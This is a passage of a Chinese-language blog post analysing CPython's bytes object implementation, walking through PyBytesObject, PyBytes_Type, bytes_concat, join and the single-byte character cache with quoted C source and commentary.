class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> Py_LIMITED_API</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    Py_hash_t ob_shash;</span><br><span class="line">    <span class="type">char</span> ob_sval[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Invariants:</span></span><br><span class="line"><span class="comment">     *     ob_sval contains space for &#x27;ob_size+1&#x27; elements.</span></span><br><span class="line"><span class="comment">     *     ob_sval[ob_size] == 0.</span></span><br><span class="line"><span class="comment">     *     ob_shash is the hash of the string or -1 if not computed yet.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125; PyBytesObject;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>Py_LIMITED_API</code>查到是和python版本挂钩的东西，这里不管。</p><p>可以看到<code>PyBytesObject</code>是变长对象，除了变长对象的共有头部<code>PyObject_VAR_HEAD</code>外，还提供了存放对象hash值结果的<code>ob_shash</code>字段，再就是存放bytes对象内容的<code>ob_sval</code>字符数组了。</p><p>从上述定义中相关的描述，我们还可以知道：</p><blockquote><ul><li><p><code>ob_sval</code>包含了<code>PyObject_VAR_HEAD.ob_size</code>长度+1个元素，且最后一个内容存放0，标志结束</p></li><li><p><code>ob_shash</code>使用来存放对象hash计算值的，当为-1时，说明尚未进行对象hash计算。之所以设置这个字段是由于python对象哈希值的应用范围很大，比如dict字典对象以来对象哈希值进行存储，由于便利计算bytes对象哈希值需要遍历其内部的字符数组，开销相对大，因此python选择将哈希值保存起来，以空间换时间，避免重复计算。（smart）</p></li></ul></blockquote><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/2.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.getsizeof(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#--------output-------#</span></span><br><span class="line"><span class="number">33</span></span><br></pre></td></tr></table></figure><p>从对象结构来回答这问题：</p><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/3.png" class=""><p>python在分配bytes对象空间对于ob_sval的元素会多分配一个，用于存放<code>b'00'</code>，头部及ob_shash的每个字段占据8字节（64位系统下），因此大小为33</p><p>创建也是类似之前探讨过的对象：</p><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/4.png" class=""><h3 id="bytes对象行为">bytes对象行为</h3><p>之前我们学习到探讨<strong>对象行为</strong>，需要从<strong>对象的类型</strong>出发，这里如出一辙，找到<code>PyBytes_Type</code>，定位到代码位置：/Objects/bytesobject.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyBytes_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>,</span><br><span class="line">    PyBytesObject_SIZE,</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="type">char</span>),</span><br><span class="line">    bytes_dealloc,                      <span class="comment">/* tp_dealloc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_print */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_reserved */</span></span><br><span class="line">    (reprfunc)bytes_repr,                       <span class="comment">/* tp_repr */</span></span><br><span class="line">    &amp;bytes_as_number,                           <span class="comment">/* tp_as_number */</span></span><br><span class="line">    &amp;bytes_as_sequence,                         <span class="comment">/* tp_as_sequence */</span></span><br><span class="line">    &amp;bytes_as_mapping,                          <span class="comment">/* tp_as_mapping */</span></span><br><span class="line">    (hashfunc)bytes_hash,                       <span class="comment">/* tp_hash */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_call */</span></span><br><span class="line">    bytes_str,                                  <span class="comment">/* tp_str */</span></span><br><span class="line">    PyObject_GenericGetAttr,                    <span class="comment">/* tp_getattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattro */</span></span><br><span class="line">    &amp;bytes_as_buffer,                           <span class="comment">/* tp_as_buffer */</span></span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE |</span><br><span class="line">        Py_TPFLAGS_BYTES_SUBCLASS,              <span class="comment">/* tp_flags */</span></span><br><span class="line">    bytes_doc,                                  <span class="comment">/* tp_doc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_traverse */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_clear */</span></span><br><span class="line">    (richcmpfunc)bytes_richcompare,             <span class="comment">/* tp_richcompare */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_weaklistoffset */</span></span><br><span class="line">    bytes_iter,                                 <span class="comment">/* tp_iter */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iternext */</span></span><br><span class="line">    bytes_methods,                              <span class="comment">/* tp_methods */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_members */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getset */</span></span><br><span class="line">    &amp;PyBaseObject_Type,                         <span class="comment">/* tp_base */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dict */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_get */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_set */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dictoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_init */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_alloc */</span></span><br><span class="line">    bytes_new,                                  <span class="comment">/* tp_new */</span></span><br><span class="line">    PyObject_Del,                               <span class="comment">/* tp_free */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从上面的<code>PyBytes_Type</code>构成，可以看出<code>PyBytesObject</code>支持的操作类型有数值型操作、序列型操作、关系型操作。</p><h4 id="数值型操作">数值型操作</h4><p>跟踪<code>bytes_as_number</code>字段，可以看到<code>bytes对象</code>支持的数值型操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyNumberMethods bytes_as_number = &#123;</span><br><span class="line">    <span class="number">0</span>,              <span class="comment">/*nb_add*/</span></span><br><span class="line">    <span class="number">0</span>,              <span class="comment">/*nb_subtract*/</span></span><br><span class="line">    <span class="number">0</span>,              <span class="comment">/*nb_multiply*/</span></span><br><span class="line">    bytes_mod,      <span class="comment">/*nb_remainder*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>bytes对象</code>竟然可以进行数值型操作？！跟进查看：<code>bytes_mod</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyObject *</span><br><span class="line"><span class="title function_">bytes_mod</span><span class="params">(PyObject *self, PyObject *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!PyBytes_Check(self)) &#123;<span class="comment">//核实操作类型和方法是否配对</span></span><br><span class="line">        Py_RETURN_NOTIMPLEMENTED;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _PyBytes_FormatEx(PyBytes_AS_STRING(self), PyBytes_GET_SIZE(self),</span><br><span class="line">                             arg, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是<code>_PyBytes_FormatEx</code>，从名字上看，是做了类C的格式化输出。</p><h4 id="序列型操作">序列型操作</h4><p>跟踪<code>bytes_as_sequence</code>来到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PySequenceMethods bytes_as_sequence = &#123;</span><br><span class="line">    (lenfunc)bytes_length, <span class="comment">/*sq_length*/</span></span><br><span class="line">    (binaryfunc)bytes_concat, <span class="comment">/*sq_concat*/</span></span><br><span class="line">    (ssizeargfunc)bytes_repeat, <span class="comment">/*sq_repeat*/</span></span><br><span class="line">    (ssizeargfunc)bytes_item, <span class="comment">/*sq_item*/</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/*sq_slice*/</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/*sq_ass_item*/</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/*sq_ass_slice*/</span></span><br><span class="line">    (objobjproc)bytes_contains <span class="comment">/*sq_contains*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>相应字段不为空的则说明相应操作存在，比如<code>bytes_length</code>，跟进发现定义位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> Py_ssize_t</span><br><span class="line"><span class="title function_">bytes_length</span><span class="params">(PyBytesObject *a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> Py_SIZE(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，是通过返回<code>PyVarObject.ob_size</code>来获取bytes对象的长度的.</p><p>再比如<code>bytes_concat</code>初看API名称，应该猜得出大概是bytes对象追加内容的功能，顺藤摸瓜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is also used by PyBytes_Concat() */</span></span><br><span class="line"><span class="type">static</span> PyObject *</span><br><span class="line"><span class="title function_">bytes_concat</span><span class="params">(PyObject *a, PyObject *b)</span></span><br><span class="line">&#123;</span><br><span class="line">    Py_buffer va, vb;</span><br><span class="line">    PyObject *result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    va.len = <span class="number">-1</span>;</span><br><span class="line">    vb.len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (PyObject_GetBuffer(a, &amp;va, PyBUF_SIMPLE) != <span class="number">0</span> ||</span><br><span class="line">        PyObject_GetBuffer(b, &amp;vb, PyBUF_SIMPLE) != <span class="number">0</span>) &#123;</span><br><span class="line">        PyErr_Format(PyExc_TypeError, <span class="string">&quot;can&#x27;t concat %.100s to %.100s&quot;</span>,</span><br><span class="line">                     Py_TYPE(b)-&gt;tp_name, Py_TYPE(a)-&gt;tp_name);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize end cases */</span></span><br><span class="line">    <span class="keyword">if</span> (va.len == <span class="number">0</span> &amp;&amp; PyBytes_CheckExact(b)) &#123;</span><br><span class="line">        result = b;</span><br><span class="line">        Py_INCREF(result);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (vb.len == <span class="number">0</span> &amp;&amp; PyBytes_CheckExact(a)) &#123;</span><br><span class="line">        result = a;</span><br><span class="line">        Py_INCREF(result);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (va.len &gt; PY_SSIZE_T_MAX - vb.len) &#123;</span><br><span class="line">        PyErr_NoMemory();</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result = PyBytes_FromStringAndSize(<span class="literal">NULL</span>, va.len + vb.len);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(PyBytes_AS_STRING(result), va.buf, va.len);</span><br><span class="line">        <span class="built_in">memcpy</span>(PyBytes_AS_STRING(result) + va.len, vb.buf, vb.len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  done:</span><br><span class="line">    <span class="keyword">if</span> (va.len != <span class="number">-1</span>)</span><br><span class="line">        PyBuffer_Release(&amp;va);</span><br><span class="line">    <span class="keyword">if</span> (vb.len != <span class="number">-1</span>)</span><br><span class="line">        PyBuffer_Release(&amp;vb);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第15行，之前完成的事两个临时对象的申请，规模同传递进来的两个操作对象，并填充进临时对象</li><li>第18-22行，当第一个操作对象va的长度为0，则函数执行结果为对象vb，进行返回</li><li>第23-27行，类似上面的过程。</li><li>第29-32行，判断va是否有充足的空间进行追加，不够则返回错误</li><li>第34-38行，重新申请足够大的bytes对象，逐一完成对象va vb内容的拷贝</li></ul><p>以上就是<code>bytes_concat</code>实现的细节了。至于bytes对象的其他序列型操作，读者可自行分析。</p><h4 id="关联型操作">关联型操作</h4><p>跟踪<code>bytes_as_mapping</code>字段，来到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyMappingMethods bytes_as_mapping = &#123;</span><br><span class="line">    (lenfunc)bytes_length,</span><br><span class="line">    (binaryfunc)bytes_subscript,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，支持的操作，第一个先前分析过的<code>bytes_length</code>还支持<code>bytes_subscript</code></p><h3 id="数据拷贝的陷阱">数据拷贝的陷阱</h3><p>考虑一下三个PyBytesObject的合并（concat）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = a + b + c</span><br></pre></td></tr></table></figure><p>实际上在python内部运行如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tmp = a + b</span><br><span class="line">result = tmp + c</span><br></pre></td></tr></table></figure><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/5.png" class=""><p>类比的发现，随着待合并的内容越多，则开销会增大。（只有最后一个对象不会重复拷贝，其余对象会拷贝n-1次）</p><h4 id="使用join方法实现">使用join方法实现</h4><p>join方法对数据拷贝进行了优化：现遍历待合并对象，得到所有对象的<code>ob_size</code>，计算总长度。根据这个值创建长度合适的result对象存放结果，再遍历待合并对象，逐一拷贝数据。</p><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/6.png" class=""><h3 id="字符缓冲池">字符缓冲池</h3><p>为了优化<code>单字节bytes对象</code>的创建效率，python内部维护了一个字符缓冲池，不同于小整数对象缓冲池的是字符缓冲池一开始为空的，随着运行逐渐添加，相关定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyBytesObject *characters[UCHAR_MAX + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>python内部创建单字节bytes对象时，先检查目标对象是否再缓冲池中。</p><p>根据注释内容，找得到相应的bytes对象创建方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   For PyBytes_FromString(), the parameter `str&#x27; points to a null-terminated</span></span><br><span class="line"><span class="comment">   string containing exactly `size&#x27; bytes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   For PyBytes_FromStringAndSize(), the parameter `str&#x27; is</span></span><br><span class="line"><span class="comment">   either NULL or else points to a string containing at least `size&#x27; bytes.</span></span><br><span class="line"><span class="comment">   For PyBytes_FromStringAndSize(), the string in the `str&#x27; parameter does</span></span><br><span class="line"><span class="comment">   not have to be null-terminated.  (Therefore it is safe to construct a</span></span><br><span class="line"><span class="comment">   substring by calling `PyBytes_FromStringAndSize(origstring, substrlen)&#x27;.)</span></span><br><span class="line"><span class="comment">   If `str&#x27; is NULL then PyBytes_FromStringAndSize() will allocate `size+1&#x27;</span></span><br><span class="line"><span class="comment">   bytes (setting the last byte to the null terminating character) and you can</span></span><br><span class="line"><span class="comment">   fill in the data yourself.  If `str&#x27; is non-NULL then the resulting</span></span><br><span class="line"><span class="comment">   PyBytes object must be treated as immutable and you must not fill in nor</span></span><br><span class="line"><span class="comment">   alter the data yourself, since the strings may be shared.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The PyObject member `op-&gt;ob_size&#x27;, which denotes the number of &quot;extra</span></span><br><span class="line"><span class="comment">   items&quot; in a variable-size object, will contain the number of bytes</span></span><br><span class="line"><span class="comment">   allocated for string data, not counting the null terminating character.</span></span><br><span class="line"><span class="comment">   It is therefore equal to the `size&#x27; parameter (for</span></span><br><span class="line"><span class="comment">   PyBytes_FromStringAndSize()) or the length of the string in the `str&#x27;</span></span><br><span class="line"><span class="comment">   parameter (for PyBytes_FromString()).</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>python创建bytes对象使用的是<code>PyBytes_FromString</code>`PyBytes_FromStringAndSize`</p><p>先看第一个<code>PyBytes_FromString</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PyObject *</span><br><span class="line"><span class="title function_">PyBytes_FromString</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    PyBytesObject *op;</span><br><span class="line"></span><br><span class="line">    assert(str != <span class="literal">NULL</span>);</span><br><span class="line">    size = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span> (size &gt; PY_SSIZE_T_MAX - PyBytesObject_SIZE) &#123;</span><br><span class="line">        PyErr_SetString(PyExc_OverflowError,</span><br><span class="line">            <span class="string">&quot;byte string is too long&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span> &amp;&amp; (op = nullstring) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COUNT_ALLOCS</span></span><br><span class="line">        null_strings++;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        Py_INCREF(op);</span><br><span class="line">        <span class="keyword">return</span> (PyObject *)op;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">1</span> &amp;&amp; (op = characters[*str &amp; UCHAR_MAX]) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COUNT_ALLOCS</span></span><br><span class="line">        one_strings++;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        Py_INCREF(op);</span><br><span class="line">        <span class="keyword">return</span> (PyObject *)op;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Inline PyObject_NewVar */</span></span><br><span class="line">    op = (PyBytesObject *)PyObject_MALLOC(PyBytesObject_SIZE + size);</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> PyErr_NoMemory();</span><br><span class="line">    (<span class="type">void</span>)PyObject_INIT_VAR(op, &amp;PyBytes_Type, size);</span><br><span class="line">    op-&gt;ob_shash = <span class="number">-1</span>;<span class="comment">//PyBytesObject.ob_shash未计算</span></span><br><span class="line">    <span class="built_in">memcpy</span>(op-&gt;ob_sval, str, size+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* share short strings */</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        nullstring = op;</span><br><span class="line">        Py_INCREF(op);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (size == <span class="number">1</span>) &#123;</span><br><span class="line">        characters[*str &amp; UCHAR_MAX] = op;</span><br><span class="line">        <span class="comment">//执行到这里，说明单字节缓冲池中没有当前申请的单字节对象，因此放入单字节缓冲池中</span></span><br><span class="line">        Py_INCREF(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (PyObject *) op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第21-27行，就是当创建的bytes对象是单字节，且在单字节缓冲池中，则直接添加缓冲池中目标的引用计数，随后返回。<code>one_strings</code>是用于计数当前单字节缓冲池的使用情况</p><p>在看第二个<code>PyBytes_FromStringAndSize</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PyObject *</span><br><span class="line"><span class="title function_">PyBytes_FromStringAndSize</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, Py_ssize_t size)</span></span><br><span class="line">&#123;</span><br><span class="line">    PyBytesObject *op;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        PyErr_SetString(PyExc_SystemError,</span><br><span class="line">            <span class="string">&quot;Negative size passed to PyBytes_FromStringAndSize&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">1</span> &amp;&amp; str != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">        (op = characters[*str &amp; UCHAR_MAX]) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COUNT_ALLOCS</span></span><br><span class="line">        one_strings++;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        Py_INCREF(op);</span><br><span class="line">        <span class="keyword">return</span> (PyObject *)op;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    op = (PyBytesObject *)_PyBytes_FromSize(size, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> (PyObject *) op;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(op-&gt;ob_sval, str, size);</span><br><span class="line">    <span class="comment">/* share short strings */</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">1</span>) &#123;</span><br><span class="line">        characters[*str &amp; UCHAR_MAX] = op;</span><br><span class="line">        Py_INCREF(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (PyObject *) op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第10-18行，对于单字节对象的创建类似。其中关键的语句是</p><p><code>if (size == 1 &amp;&amp; str != NULL &amp;&amp;(op = characters[*str &amp; UCHAR_MAX]) != NULL)</code>解释：当创建的是单字节对象 &amp;&amp; 内容是不为NULL &amp;&amp; 内容不在单字节缓冲池中。</p><h1>疑问</h1><p>但貌似没看到放入缓冲池的操作，先留个疑问吧。从代码上看貌似只是将缓冲池使用计数的<code>one_strings++</code>而已，后续在此分配怎么直接引用的？hash？</p><p>有没有老哥对于这点有思路的？</p><p>好吧，自己画了遍下边的示意图：</p><img src="/2022/05/23/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-bytes%E5%AF%B9%E8%B1%A1/7.png" class=""><p>发现貌似自己能解答这个问题了（个人理解，可能存在错误），也不修改了，当作个纪念，告诉自己，勤动手才是正确的学习方法。</p><p>我们重新贴一遍单bytes对象创建的关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 